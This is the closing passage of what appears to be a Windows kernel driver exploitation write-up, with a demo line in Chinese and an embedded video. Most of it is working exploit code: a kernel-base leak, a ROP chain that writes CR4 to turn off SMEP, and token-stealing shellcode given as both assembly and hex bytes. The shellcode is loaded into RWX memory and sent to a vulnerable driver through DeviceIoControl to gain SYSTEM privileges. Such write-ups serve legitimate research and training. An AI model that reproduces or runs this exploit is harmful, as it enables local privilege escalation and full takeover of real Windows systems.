    uintptr_t leak_kernel = STACK_VAL[33]; // Stack start + 0x108
    uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
    printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
    printf("[!] Kernel Base: 0x%llx\n", kernel_base);

    uintptr_t payload[75];


    for(int i=0; i < 37; i++){
        payload[i] = ADDR(STACK_VAL[i]);
    }

    payload[37] = ADDR(kernel_base + 0x7a7baf); //0x1407a7baf: pop rcx ; ret ;
    payload[38] = ADDR(0x50ef0);
    payload[39] = ADDR(kernel_base + 0x47f027); // 0x14047f027: mov cr4, rcx ; ret ;

    DWORD PID = GetCurrentProcessId();

    /*
    mov rdx, gs:[0x188]; 
    mov rdx, [rdx+0xb8];
    mov r9, [rdx+0x1d8];
    mov rcx, r9;

    srch_for_sys:
    mov rdx, [rcx - 8];
    cmp rdx, 4;
    jz out1;
    mov rcx, [rcx];         
    jmp srch_for_sys;

    out1:
    mov rax, [rcx + 0x70];

    srch_our_proc:
    mov rdx, [rcx - 8];
    cmp rdx, 0x7788;
    jz final;
    mov rcx, [rcx];
    jmp srch_our_proc;

    final:
    mov [rcx + 0x70], rax;

    loop:
    jmp loop;

    ret;
    */

    char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4C\x8B\x8A\xD8\x01\x00\x00\x4C\x89\xC9\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x48\x8B\x51\xF8\x48\x81\xFA\x88\x77\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xEB\xFE\xC3";
    shellcode[52]=(char)PID;
    shellcode[53]=(char)(PID>>8);

    uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_ptr, shellcode, sizeof(shellcode));

    payload[40] = ADDR(shellcode_ptr);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)get_shell, NULL, NULL, NULL);
    BOOL result3 = DeviceIoControl(
        hDevice,
        DeVioctlCode,
        payload,
        sizeof(payload),
        NULL,
        sizeof(payload),
        &bytesReturned,
        NULL
    );

    return 0;
}
```

## Demo
最終可以在 windows 上通過執行 exploit 拿到 ntos 權限來 EoP

<iframe width="560" height="315" src="https://www.youtube.com/embed/x8Z_jroNCEw?si=Pl8I_-81Sz72tKDP" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>